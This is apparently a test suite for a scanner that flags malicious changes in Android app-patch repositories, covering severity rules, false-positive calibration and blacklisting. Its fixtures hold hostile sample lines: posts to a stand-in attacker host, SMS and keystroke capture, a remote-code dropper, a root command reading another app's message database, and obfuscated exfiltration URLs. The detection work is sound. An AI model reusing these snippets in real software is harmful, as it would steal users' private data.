import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { scanDiff, updateSignalsAndCrossCheck, updateBlacklist, applyPardons, isTestPath, extractSignals, reportFilename, nextRunSeq, renderRepoReport } from "../scanner.mjs";
import { readFileSync } from "node:fs";

const cfg = JSON.parse(readFileSync("config/allowlist.json", "utf8"));

function diffFor(file, addedLines) {
  const body = addedLines.map((l) => "+" + l).join("\n");
  return "diff --git a/" + file + " b/" + file + "\n+++ b/" + file + "\n" + body + "\n";
}

describe("audit rules", () => {
  it("includes LLM adjudication and unreviewed reasons in reports", () => {
    const report = renderRepoReport("o/r", "abc1234", [
      { severity: "high", file: "A.kt", reason: "sensitive data to network", excerpt: "code", llmReview: { verdict: "suspicious", confidence: 0.7, category: "exfiltration", reasoning: "sink not established" } },
      { severity: "medium", file: "B.kt", reason: "unknown host", excerpt: "code", llmReview: { status: "unreviewed", reason: "monthly LLM budget reached" } },
    ], "2026-10-22");
    assert.match(report, /suspicious \(0.7, exfiltration\): sink not established/);
    assert.match(report, /unreviewed \(monthly LLM budget reached\)/);
  });
  it("ignores premium-unlock-only patches", () => {
    const d = diffFor("patches/Unlock.kt", ["returnEarly(true)", "val isPremium = true"]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("flags sensitive source reaching network sink as high", () => {
    const d = diffFor("patches/Sync.kt", ["val id = getDeviceId()", "OkHttp.newCall(url).execute()"]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "high");
  });
  it("ignores security indicators in comments but scans executable code", () => {
    const comments = diffFor("patches/Notes.kt", [
      "// getDeviceId() is documented here; OkHttp is only mentioned",
      "/* READ_SMS, TextWatcher, and https://evil.example.evil123 are examples */",
      'val help = "the literal // is not a comment"',
    ]);
    assert.equal(scanDiff(comments, cfg).length, 0);
    const code = diffFor("patches/Sync.kt", [
      "// getDeviceId() should not count",
      "val id = getDeviceId()",
      "OkHttp.newCall(url).execute()",
    ]);
    assert.ok(scanDiff(code, cfg).some((f) => f.severity === "high"));
  });
  it("preserves comment-like content in Kotlin raw strings", () => {
    const d = diffFor("patches/Docs.kt", [
      'val example = """',
      "https://evil.example.evil123/path",
      '"""',
    ]);
    assert.equal(scanDiff(d, cfg).length, 1);
  });
  it("flags unknown exfil host as medium", () => {
    const d = diffFor("patches/Ping.kt", ["val u = \"https://evil.example.evil123/ping\""]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "medium");
  });
  it("ignores allowlisted google/youtube hosts", () => {
    const d = diffFor("patches/Api.kt", ["val u = \"https://www.googleapis.com/youtube/v3/captions\""]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("ignores the Android XML resource namespace", () => {
    const d = diffFor("patches/CustomFontPatch.kt", [
      'appendLine("<font-family xmlns:android=\\"http://schemas.android.com/apk/res/android\\">")',
    ]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("flags embedded secrets as high", () => {
    const d = diffFor("patches/Key.kt", ["val k = \"AKIAIOSFODNN7EXAMPLE\""]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "high");
  });
  it("flags dangerous manifest permission as high", () => {
    const d = diffFor("app/AndroidManifest.xml", ["<uses-permission android:name=\"android.permission.READ_SMS\"/>"]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "high");
  });
});
  it("ignores user-configured example snippets with placeholder keys", () => {
    const d = diffFor("patches/JsExamples.kt", [
      "const apiKey = \"REPLACE_WITH_OPENAI_API_KEY\";",
      "url: \"https://api.openai.com/v1/responses\",",
    ]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });

describe("v2 smart rules", () => {
  const EVIL = "https://evil.example.evil123/submit";
  it("flags base64-hidden exfil host as high", () => {
    const b64 = Buffer.from(EVIL, "utf8").toString("base64");
    assert.ok(b64.length >= 40);
    const d = diffFor("patches/Sync.kt", ["val d = \"" + b64 + "\""]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "high");
  });
  it("flags hex-escaped URL as high", () => {
    const hex = EVIL.split("").map((c) => "\\x" + c.charCodeAt(0).toString(16).padStart(2, "0")).join("");
    const d = diffFor("patches/Sync.kt", ["val d = \"" + hex + "\""]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "high");
  });
  it("flags string-concat split URL as high", () => {
    const d = diffFor("patches/Sync.kt", ["val u = \"https://evil\" + \".example.evil123/submit\""]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "high");
  });
  it("flags hex-dotted and integer-encoded IPs as suspicious", () => {
    const d = diffFor("patches/Net.kt", ["val a = \"0xC0.0xA8.0x1.0x17\"", "val b = \"0xC0A80114\""]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "medium"));
  });
  it("treats decimal-integer IP as suspicious only with network context", () => {
    const ipInt = String(((192 * 256 + 168) * 256 + 1) * 256 + 20);
    assert.equal(ipInt.length, 10);
    const clean = diffFor("patches/V.kt", ["val versionCode = " + ipInt]);
    assert.equal(scanDiff(clean, cfg).length, 0);
    const netty = diffFor("patches/Net.kt", ["val ip = " + ipInt, "val host = InetAddress.getByName(ip)", "Socket(host, 443)"]);
    assert.ok(netty && scanDiff(netty, cfg).length > 0);
  });
  it("flags ngrok-style infra host as medium alone", () => {
    const d = diffFor("patches/Tunnel.kt", ["val u = \"https://abc123.ngrok-free.app/hook\""]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "medium");
  });
  it("escalates risky-infra host to high when combined with a source", () => {
    const d = diffFor("patches/Tunnel.kt", [
      "val u = \"https://abc123.ngrok-free.app/hook\"",
      "val id = getDeviceId()",
      "OkHttp.newCall(url).execute()",
    ]);
    assert.ok(scanDiff(d, cfg).some((x) => x.severity === "high"));
  });
  it("flags added native binary as medium and .mpe blob as info", () => {
    const so = "diff --git a/lib/arm64-v8a/x.so b/lib/arm64-v8a/x.so\nBinary files a/lib/arm64-v8a/x.so and b/lib/arm64-v8a/x.so differ\n";
    const fso = scanDiff(so, cfg);
    assert.equal(fso.length, 1);
    assert.equal(fso[0].severity, "medium");
    const mpe = "diff --git a/ext/feat.mpe b/ext/feat.mpe\nBinary files a/ext/feat.mpe and b/ext/feat.mpe differ\n";
    const fmpe = scanDiff(mpe, cfg);
    assert.equal(fmpe.length, 1);
    assert.equal(fmpe[0].severity, "info");
  });
  it("cross-window: stored host plus new source/sink flags high", () => {
    const store = { repos: { demo: { files: { "patches/Sync.kt": { hosts: [{ v: EVIL, d: "2026-10-01" }], sources: [], sinks: [], perms: [], pinning: [], sms: [], spy: [], keylog: [], staged: [] } }, updated: "2026-10-01" } } };
    const d = diffFor("patches/Sync.kt", ["val id = getDeviceId()", "OkHttp.newCall(url).execute()"]);
    const r = updateSignalsAndCrossCheck("demo", d, cfg, store, "2026-10-12");
    assert.ok(r.findings.some((x) => x.severity === "high" && /across windows/.test(x.reason)));
  });
  it("cross-window: new unknown host plus stored source flags high", () => {
    const store = { repos: { demo: { files: { "patches/Ping.kt": { hosts: [], sources: [{ v: "getDeviceId", d: "2026-10-01" }], sinks: [], perms: [], pinning: [], sms: [], spy: [], keylog: [], staged: [] } }, updated: "2026-10-01" } } };
    const d = diffFor("patches/Ping.kt", ["val u = \"" + EVIL + "\""]);
    const r = updateSignalsAndCrossCheck("demo", d, cfg, store, "2026-10-12");
    assert.ok(r.findings.some((x) => x.severity === "high" && /across windows/.test(x.reason)));
  });
  it("cross-window: halves in different files do not combine", () => {
    const store = { repos: { demo: { files: { "feat/A.kt": { hosts: [], sources: [{ v: "getDeviceId", d: "2026-10-01" }], sinks: [], perms: [], pinning: [], sms: [], spy: [], keylog: [], staged: [] } }, updated: "2026-10-01" } } };
    const d = diffFor("feat/B.kt", ["val u = \"" + EVIL + "\""]);
    const r = updateSignalsAndCrossCheck("demo", d, cfg, store, "2026-10-12");
    assert.equal(r.findings.length, 0);
  });
});

describe("v6 false-positive kills", () => {
  it("skips test files entirely (findings and signals)", () => {
    assert.ok(isTestPath("extensions/facebook/src/test/java/app/ScreenLogTest.java"));
    assert.ok(isTestPath("patches/src/test/kotlin/app/AppLabelTest.kt"));
    assert.ok(!isTestPath("patches/Sync.kt"));
    const d = diffFor("patches/src/test/kotlin/app/EvilTest.kt", ["val u = \"https://evil.example.evil123/x\"", "OkHttp.newCall(u).execute()"]);
    assert.equal(scanDiff(d, cfg).length, 0);
    assert.deepEqual(extractSignals(d, cfg), { files: {} });
  });
  it("ignores font-magic hex constants without network context (Hush FontFile)", () => {
    const d = diffFor("extensions/messenger/FontFile.java", ["private static final int HEAD = 0x68656164;", "private static final int HHEA = 0x68686561;", "private static final int OS2 = 0x4F532F32;"]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("rejects invalid and non-routable IP literals", () => {
    assert.equal(scanDiff(diffFor("patches/V.kt", ["val v = \"400.0.0.1\""]), cfg).length, 0);
    assert.equal(scanDiff(diffFor("patches/C.kt", ["val c = 0x00FFFFFF", "val m = 0xFFFAF7F9"]), cfg).length, 0);
    assert.equal(scanDiff(diffFor("patches/U.kt", ["val u = \"https://www.\""]), cfg).length, 0);
  });
  it("still flags encoded IP when a real network sink is present", () => {
    const d = diffFor("patches/Net.kt", ["val ip = 0xC0A80114", "val host = InetAddress.getByName(ip)", "Socket(host, 4444)"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "medium"));
  });
  it("does not treat a bare Intent as an exfil sink", () => {
    const d = diffFor("patches/Share.kt", ["val id = getDeviceId()", "startActivity(new Intent(ctx, ShareActivity.class))"]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("Hush regression: test-fixture URLs plus stored TextWatcher do not ban", () => {
    const store = { repos: { demo: { files: { "feat/Input.kt": { hosts: [], sources: [], sinks: [], perms: [], pinning: [], sms: [], spy: [], keylog: [{ v: "TextWatcher", d: "2026-10-12" }], staged: [] } }, updated: "2026-10-12" } } };
    const d = diffFor("extensions/facebook/src/test/java/app/ScreenLogTest.java", ["Uri.parse(\"fb://profile/1234567890\")", "redact(\"m.me/1234567890 www.instagram.com/janedoe\")"]);
    const r = updateSignalsAndCrossCheck("demo", d, cfg, store, "2026-10-13");
    assert.equal(r.findings.length, 0);
  });
  it("migrates legacy repo-level signal stores without crashing", () => {
    const legacy = { repos: { demo: { hosts: [{ v: "https://old.example/x", d: "2026-10-01" }], sources: [], sinks: [], perms: [], pinning: [], updated: "2026-10-01" } } };
    const d = diffFor("patches/Sync.kt", ["val id = getDeviceId()"]);
    const r = updateSignalsAndCrossCheck("demo", d, cfg, legacy, "2026-10-13");
    assert.ok(Array.isArray(r.findings));
    assert.ok(r.store.repos.demo.files);
  });
});

describe("v3 critical and sneaky tricks", () => {
  const EVIL = "https://evil.example.evil123/submit";
  it("flags SMS interception with network as critical", () => {
    const d = diffFor("patches/Sms.kt", ["val msg = SmsMessage.createFromPdu(pdu)", "OkHttp.newCall(req(\"" + EVIL + "\")).execute()"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "critical" && /SMS/i.test(x.reason)));
  });
  it("flags notification/accessibility capture with external host as critical", () => {
    const d = diffFor("patches/Spy.kt", ["class L : NotificationListenerService()", "post(\"" + EVIL + "\", notificationText)"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "critical"));
  });
  it("does not flag accessibility service alone (no network)", () => {
    const d = diffFor("patches/A11y.kt", ["class H : AccessibilityService()", "override fun onAccessibilityEvent(e: AccessibilityEvent) {}"]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("flags keystroke capture with network as critical", () => {
    const d = diffFor("patches/Kb.kt", ["override fun onKeyEvent(e: KeyEvent)", "socket.send(keyCode)", "val u = \"" + EVIL + "\""]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "critical" && /keystroke/i.test(x.reason)));
  });
  it("flags runtime code download plus execution as critical", () => {
    const d = diffFor("patches/Dyn.kt", ["val cl = DexClassLoader(dexPath, od, null, cl)", "download(\"" + EVIL + "\", dexPath)"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "critical" && /dropper|download/i.test(x.reason)));
  });
  it("does not flag dynamic loading alone (extension mechanism)", () => {
    const d = diffFor("patches/Ext.kt", ["val cl = DexClassLoader(localPath, od, null, cl)"]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("flags cross-app private data read with network as critical", () => {
    const d = diffFor("patches/Steal.kt", ["open(\"/data/data/com.zing.zalo/shared_prefs/x.xml\")", "post(\"" + EVIL + "\", data)"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "critical" && /cross-app|other app|private/i.test(x.reason)));
  });
  it("flags su plus stolen data path as critical", () => {
    const d = diffFor("patches/Root.kt", ["Runtime.getRuntime().exec(\"su -c cat /data/data/com.facebook.orca/databases/threads.db\")"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "critical"));
  });
  it("flags WebView JS bridge with network sink as high", () => {
    const d = diffFor("patches/Wv.kt", ["wv.addJavascriptInterface(obj, \"a\")", "OkHttp.newCall(u).execute()"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "high" && /bridge/i.test(x.reason)));
  });
  it("flags DNS-plus-encoding combo as high (DNS exfil)", () => {
    const d = diffFor("patches/Dns.kt", ["val ip = InetAddress.getByName(Base64.encodeToString(id))"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "high" && /DNS/i.test(x.reason)));
  });
  it("flags new external maven repository as high (supply chain)", () => {
    const d = diffFor("app/build.gradle.kts", ["maven { url = uri(\"https://evil-maven.example.evil123/m2\") }"]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "high");
  });
  it("notes new external dependency as info", () => {
    const d = diffFor("app/build.gradle.kts", ["implementation(\"com.evil:lib:1.0\")"]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "info");
  });
  it("flags typosquat of allowlisted domain as high", () => {
    const d = diffFor("patches/Api.kt", ["val u = \"https://morphe-softwrae.com/api\""]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "high" && /typosquat/i.test(x.reason)));
  });
  it("flags screen/mic capture with network sink as high", () => {
    const d = diffFor("patches/Rec.kt", ["val pm = mediaProjectionManager", "OkHttp.newCall(upload(stream)).execute()", "MediaProjection probe"]);
    const f = scanDiff(d, cfg);
    assert.ok(f.some((x) => x.severity === "high" && /capture/i.test(x.reason)));
  });
  it("does not flag plain reflection without network", () => {
    const d = diffFor("patches/Hook.kt", ["val m = cls.getDeclaredMethod(\"doPay\")", "m.isAccessible = true"]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
});

describe("v4 permanent blacklist", () => {
  it("blacklists only on LLM-confirmed critical findings", () => {
    const confirmed = [{ severity: "critical", file: "x", reason: "SMS theft", excerpt: "", llm: "confirmed" }];
    const r = updateBlacklist("demo", "o/demo", "abc123", confirmed, {}, "2026-10-12");
    assert.equal(r.banned, true);
    assert.equal(r.blacklist.repos.demo.since, "2026-10-12");
    assert.match(r.blacklist.repos.demo.report, /demo\.md/);
    assert.match(r.blacklist.repos.demo.reason, /SMS/);
  });
  it("never bans on unconfirmed, pending or overruled criticals", () => {
    for (const mark of [undefined, "pending", "queued", "overruled", "unreviewed"]) {
      const f = [{ severity: "critical", file: "x", reason: "y", excerpt: "" }];
      if (mark) f[0].llm = mark;
      const r = updateBlacklist("demo", "o/demo", "abc", f, {}, "2026-10-12");
      assert.equal(r.banned, false, "banned on mark=" + mark);
      assert.deepEqual(r.blacklist, { repos: {} });
    }
  });
  it("does not blacklist on clean or high-only findings", () => {
    const r1 = updateBlacklist("demo", "o/demo", "abc", [], {}, "2026-10-12");
    assert.equal(r1.banned, false);
    assert.deepEqual(r1.blacklist, { repos: {} });
    const r2 = updateBlacklist("demo", "o/demo", "abc",
      [{ severity: "high", file: "x", reason: "y", excerpt: "" }], {}, "2026-10-12");
    assert.equal(r2.banned, false);
    assert.deepEqual(r2.blacklist, { repos: {} });
  });
  it("keeps the original entry forever once blacklisted", () => {
    const store = { repos: { demo: { repo: "o/demo", since: "2026-10-01", sha: "oldsha", reason: "old", report: "reports/2026-10-01/demo.md" } } };
    const r = updateBlacklist("demo", "o/demo", "newsha", [], store, "2026-10-12");
    assert.equal(r.banned, true);
    assert.equal(r.blacklist.repos.demo.since, "2026-10-01");
    assert.equal(r.blacklist.repos.demo.sha, "oldsha");
  });
  it("frees pardoned repos but keeps everyone else banned", () => {
    const bl = { repos: { a: { repo: "o/a" }, b: { repo: "o/b" } } };
    const r = applyPardons(bl, { pardoned: ["a"], reason: "fp" });
    assert.deepEqual(r.freed, ["a"]);
    assert.ok(!r.blacklist.repos.a && r.blacklist.repos.b);
  });
  it("names reports per scan with sequence and finding counts, never overwriting", () => {
    assert.equal(reportFilename("doom", "2026-10-13", 3, "OK", { crit: 0, high: 0, med: 0 }), "doom-run03-OK.md");
    assert.equal(reportFilename("hush-facebook", "2026-10-13", 4, "WARN", { crit: 0, high: 0, med: 1 }), "hush-facebook-run04-WARN-c0h0m1.md");
    assert.equal(reportFilename("a/b", "2026-10-13", 1, "CRIT", { crit: 1, high: 2, med: 0 }), "a_b-run01-CRIT-c1h2m0.md");
  });
  it("computes the next run sequence from existing day files", () => {
    assert.equal(nextRunSeq([], "doom"), 1);
    assert.equal(nextRunSeq(["doom-run01-OK.md", "doom-run02-WARN-c0h0m1.md", "piko-run01-OK.md", "doom.md"], "doom"), 3);
    assert.equal(nextRunSeq(["piko-run01-OK.md"], "doom"), 1);
  });
});

describe("v8 calibration (live Fleet FPs)", () => {
  it("ignores version quadruples on version lines (doom Constants.kt)", () => {
    const d = diffFor("patches/src/main/kotlin/app/template/patches/shared/Constants.kt", [
      'targets = listOf(AppTarget(version = "4.6.7.1", versionCode = 3000933))',
      'targets = listOf(AppTarget(version = "32.18.0.300", versionCode = 1243240206))',
    ]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("still flags a bare routable IP on a non-version line", () => {
    const d = diffFor("patches/Net.kt", ['val s = Socket("10.0.0.1", 4444)']);
    const f = scanDiff(d, cfg);
    assert.ok(f.length > 0);
  });
  it("ignores a pathless version-like-quad URL but keeps 3-digit-octet hosts", () => {
    const d1 = diffFor("settings.gradle.kts", ['maven { url = uri("http://2.0.6.1") }']);
    assert.equal(scanDiff(d1, cfg).length, 0);
    const d2 = diffFor("patches/Ping.kt", ['val u = "http://192.168.1.1/status"']);
    assert.ok(scanDiff(d2, cfg).length > 0);
    const d3 = diffFor("patches/Ping.kt", ['val u = "http://10.0.0.1/api/collect"']);
    assert.ok(scanDiff(d3, cfg).length > 0);
  });
  it("does not treat view coordinates as a location source", () => {
    const d = diffFor("patches/Ui.kt", ["view.getLocationOnScreen(place);", "OkHttp.newCall(url).execute()"]);
    assert.equal(scanDiff(d, cfg).length, 0);
  });
  it("still flags real location access reaching a sink", () => {
    const d = diffFor("patches/Sync.kt", ["val l = lm.getLastKnownLocation()", "OkHttp.newCall(url).execute()"]);
    const f = scanDiff(d, cfg);
    assert.equal(f.length, 1);
    assert.equal(f[0].severity, "high");
  });
  it("skips gradle-wrapper binaries but not other jars", () => {
    const bin = (p) => "diff --git a/" + p + " b/" + p + "\nBinary files a/" + p + " and b/" + p + " differ\n";
    assert.equal(scanDiff(bin("gradle/wrapper/gradle-wrapper.jar"), cfg).length, 0);
    assert.equal(scanDiff(bin("libs/evil.jar"), cfg)[0].severity, "medium");
  });
  it("ignores internal project() deps but keeps catalog/coordinates visible", () => {
    const d1 = diffFor("extensions/x/build.gradle.kts", ['implementation(project(":extensions:shared"))']);
    assert.equal(scanDiff(d1, cfg).length, 0);
    const d2 = diffFor("extensions/x/build.gradle.kts", ['implementation("com.squareup.okhttp3:okhttp:4.12.0")']);
    assert.equal(scanDiff(d2, cfg)[0].severity, "info");
    const d3 = diffFor("extensions/x/build.gradle.kts", ["api(libs.volley)"]);
    assert.equal(scanDiff(d3, cfg)[0].severity, "info");
  });
  it("downgrades same-app cookie use to high but keeps cross-package paths critical", () => {
    const d1 = diffFor("patches/Sess.kt", ["CookieManager.getInstance().getCookies(u)", "OkHttp.newCall(url).execute()"]);
    const f1 = scanDiff(d1, cfg);
    assert.ok(f1.every((f) => f.severity !== "critical"));
    assert.ok(f1.some((f) => f.severity === "high" && /cookie/i.test(f.reason)));
    const d2 = diffFor("patches/Sess.kt", ["val p = \"/data/data/com.other.app/shared_prefs/x\"", "OkHttp.newCall(url).execute()"]);
    assert.equal(scanDiff(d2, cfg)[0].severity, "critical");
  });
  it("downgrades location-to-map-API to medium, keeps attacker hosts high", () => {
    const d1 = diffFor("patches/Map.kt", ["val l = lm.getLastKnownLocation()", "OkHttp.newCall(url).execute()", 'val u = "https://lz4.overpass-api.de/api/interpreter"']);
    const f1 = scanDiff(d1, cfg);
    assert.equal(f1.length, 1);
    assert.equal(f1[0].severity, "medium");
    assert.match(f1[0].reason, /map\/geocode/);
    const d2 = diffFor("patches/Map.kt", ["val l = lm.getLastKnownLocation()", "OkHttp.newCall(url).execute()", 'val u = "https://evil.example.evil123/x"']);
    assert.equal(scanDiff(d2, cfg)[0].severity, "high");
  });
  it("downgrades cross-window location-to-map-API to medium", () => {
    const mk = (sources, hosts) => ({ repos: { t: { files: { "patches/Map.kt": { hosts: [], sources, sinks: [], perms: [], pinning: [], sms: [], spy: [], keylog: [], staged: [] } }, updated: "2026-10-14" } } });
    const withHosts = (store, hosts) => { store.repos.t.files["patches/Map.kt"].hosts = hosts; return store; };
    const d = diffFor("patches/Map.kt", ['val u = "https://z.overpass-api.de/api/interpreter"']);
    const r1 = updateSignalsAndCrossCheck("t", d, cfg, mk([{ v: "Location", d: "2026-10-14" }], []), "2026-10-14");
    const xw1 = r1.findings.filter((f) => f.file === "cross-window");
    assert.equal(xw1.length, 1);
    assert.equal(xw1[0].severity, "medium");
    const d2 = diffFor("patches/Map.kt", ['val u = "https://evil.example.evil123/x"']);
    const r2 = updateSignalsAndCrossCheck("t", d2, cfg, mk([{ v: "Location", d: "2026-10-14" }], []), "2026-10-14");
    assert.equal(r2.findings.filter((f) => f.file === "cross-window")[0].severity, "high");
  });
  it("skips repo-root dev-tooling dirs but not nested app packages named tools", () => {
    assert.ok(isTestPath("tools/verification-probe/src/Probe.java"));
    assert.ok(!isTestPath("patches/src/main/java/com/x/tools/Helper.kt"));
  });
  it("ignores bare integer literals unless IP-conversion code is present", () => {
    const d1 = diffFor("patches/Theme.kt", ["val c = 4281019179", "WebViewClient()", "loadUrl(u)"]);
    assert.equal(scanDiff(d1, cfg).length, 0);
    const d2 = diffFor("patches/Net.kt", ["val ip = 3232235777", "InetAddress.getByName((ip shr 24) + \".\" + ((ip shr 16) & 0xFF))", "Socket(a, 443)"]);
    assert.ok(scanDiff(d2, cfg).some((f) => /decimal-encoded IP/i.test(f.reason)));
  });
});
